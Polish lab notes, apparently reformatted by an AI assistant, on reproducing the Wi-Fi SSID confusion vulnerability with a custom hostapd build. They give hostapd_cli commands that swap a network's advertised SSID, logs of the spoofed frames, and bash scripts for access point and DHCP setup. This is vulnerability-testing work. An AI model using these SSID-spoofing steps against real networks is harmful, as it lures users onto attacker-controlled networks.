Oczywiście! Oto tekst w formacie Markdown bez zmian w treści:

---

# Próba przedestowania podatności hosta SSID confusion

## Co się udało:
- Build custom wersji hostapd (bardzo niejasna instrukcja, większości trzeba sie domyślic)
- Ustawienie karty sieciowej zeby z nami wspolpracowala (network manager, monitor mode)
- Bash scripty do konfiguracji AP na naszej karcie sieciowej, prostego servera DHCP (cel - mobile client nie chce się połączyć do sieci jak nie dostaje zadnego IP)
- Postawienie AP - siec jest widoczna dla clienta ale no security -> no i tu jest glowny problem, w tym custom confie hostapd nie dziala wpa

## No więc co sie dzieje:
- Jak mamy postawiony server dhcp to client jest w stanie polaczyc sie do sieci ALE:

```bash
sudo ./hostapd hostapd_test.conf
```

```
wlo1: interface state UNINITIALIZED->ENABLED
wlo1: AP-ENABLED 
>>> Simulating attack: Overwriting SSID in outgoing Beacon frames
>>> Simulating attack: Overwriting SSID of outgoing Probe Response
>>> Simulating attack: Overwriting SSID of outgoing Probe Response
>>> Simulating attack: Overwriting SSID of outgoing Probe Response
wlo1: STA 6e:69:91:91:90:fd IEEE 802.11: authenticated
>>> Simulating attack: Overwriting SSID of incoming Association Request
wlo1: STA 6e:69:91:91:90:fd IEEE 802.11: associated (aid 1)
wlo1: AP-STA-CONNECTED 6e:69:91:91:90:fd
wlo1: STA 6e:69:91:91:90:fd RADIUS: starting accounting session 18A9B916F883346D
>>> Simulating attack: Overwriting SSID of outgoing Probe Response
>>> Simulating attack: Overwriting SSID of outgoing Probe Response
>>> Simulating attack: Overwriting SSID of outgoing Probe Response
>>> Simulating attack: Overwriting SSID of outgoing Probe Response
```

Z jakiegos powodu nasz AP robi jakiego autha prze Radiusa XD. Próbowałem to wyłączyć przez zacomentowanie wszystkich ustawien z radiusem w hostapd/.config (jest nawet linijka do wyłączenia calego radiusa) - no ale efekt calt czas taki sam.

## Jak to wyglada z perspektywy usera:
- Stawiamy Siec connectssid - client ja widzi i moze sie polaczyc
- Jak zrobimy ta komende co symuluje atak:
	```bash
	./hostapd_cli -p wpaspy_ctrl raw "FAKESSID changedssid"
	```
	- Client zaczyna widzec po prostu inna siec "changedssid", jak chce to do niej rowniez sie moze polaczyc

### Testowalem jeszcze ten optimized attack, tam sie robi tak ze stawiasz siec, laczysz sie do niej i dopiero jak juz masz clienta zasocjowanego to podmieniasz to ssid:

	```bash
	./hostapd_cli -p wpaspy_ctrl raw "CHANGESSID changedssid"
	```

Co sie wtedy dzieje - Połączony client sie po prostu rozlacza i po chwili widzi nowa siec "changedssid"

## Moje skrypty w bashu zeby nie pisac milion razy tego samego

### `setup_ap.sh`:

```bash
if [ "$EUID" -ne 0 ]; then
  echo "Please run as root"
  exit 1
fi

INTERFACE="wlo1"
IP_ADDRESS="192.168.100.1/24"

echo "Disabling Wi-Fi management by NetworkManager"
nmcli radio wifi off

echo "Unblocking Wi-Fi using rfkill"
rfkill unblock wifi

echo "Taking down interface $INTERFACE"
ip link set "$INTERFACE" down

echo "Setting interface $INTERFACE to AP mode"
iw "$INTERFACE" set type __ap

echo "Bringing up interface $INTERFACE"
ip link set "$INTERFACE" up

echo "Assigning IP address $IP_ADDRESS to $INTERFACE"
ip addr add "$IP_ADDRESS" dev "$INTERFACE"

echo "Wireless configuration:"
iwconfig
```

### `setup_dhcp.sh`

```bash
#!/bin/bash

if [ "$EUID" -ne 0 ]; then
  echo "Please run as root"
  exit 1
fi

INTERFACE="wlo1"
DNSMASQ_CONF="dnsmasq.conf"

echo "Setting up dnsmasq configuration"
cat <<EOF > "$DNSMASQ_CONF"
interface=$INTERFACE
dhcp-range=192.168.100.10,192.168.100.200,8h
dhcp-option=3,192.168.100.1
dhcp-option=6,192.168.100.1
server=8.8.8.8
# log-queries
# log-dhcp
EOF

echo "dnsmasq configuration written to $DNSMASQ_CONF"

echo "Starting dnsmasq with configuration: $DNSMASQ_CONF"
dnsmasq -d -C "$DNSMASQ_CONF"
```

### `revoke_services.sh`

```bash
#!/bin/bash

if [ "$EUID" -ne 0 ]; then
  echo "Please run as root"
  exit 1
fi

ACTION="$1"

if [[ "$ACTION" == "disable" ]]; then
  echo "Stopping, disabling, and masking systemd-resolved"
  systemctl stop systemd-resolved
  systemctl disable systemd-resolved
  systemctl mask systemd-resolved
  echo "systemd-resolved has been disabled and masked"
elif [[ "$ACTION" == "enable" ]]; then
  echo "Unmasking, enabling, and starting systemd-resolved"
  systemctl unmask systemd-resolved
  systemctl enable systemd-resolved
  systemctl start systemd-resolved
  echo "systemd-resolved has been restored"
else
  echo "Usage: $0 [disable|enable]"
  exit 1
fi
```

## Kroki co sie robi po kolei żeby pamietac na przyszlosc:
1. Build custom hostapd na podstawie .config (makefile)
2. Setup systemu i interfejsu pod ap (script albo z palca)
3. Zwolnienie portu żeby server dhcp dzialal
4. Setup servera dhcp
5. No a dalej próbujesz postępować z tym jakże skromnym readme na repo XD

---
